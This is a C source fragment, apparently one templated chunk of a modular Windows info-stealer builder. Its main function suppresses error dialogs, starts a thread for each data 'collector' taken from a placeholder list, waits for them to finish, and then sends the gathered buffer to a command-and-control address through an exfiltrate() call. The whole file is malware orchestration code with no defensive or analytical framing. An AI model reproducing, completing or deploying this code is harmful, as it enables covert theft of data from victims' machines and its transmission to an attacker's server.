// chunk: arch/threaded
// depends: core/emit_buffer, exfil/*
// provides: main
// note: each collector runs in its own thread — faster on multi-core targets

#ifndef CHUNK_ARCH_THREADED
#define CHUNK_ARCH_THREADED

typedef void (*collector_fn)(void);

static DWORD WINAPI collector_thread(LPVOID param) {
    collector_fn fn = (collector_fn)param;
    fn();
    return 0;
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

    init_buffer();
    if (!g_data) return 1;

    collector_fn collectors[] = {
        {{COLLECTOR_FN_LIST}}
    };
    int n_collectors = sizeof(collectors) / sizeof(collectors[0]);

    HANDLE *threads = (HANDLE *)malloc(n_collectors * sizeof(HANDLE));
    if (!threads) return 1;

    for (int i = 0; i < n_collectors; i++) {
        threads[i] = CreateThread(NULL, 0, collector_thread, (LPVOID)collectors[i], 0, NULL);
    }

    WaitForMultipleObjects(n_collectors, threads, TRUE, 60000);

    for (int i = 0; i < n_collectors; i++) {
        if (threads[i]) CloseHandle(threads[i]);
    }
    free(threads);

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

#endif
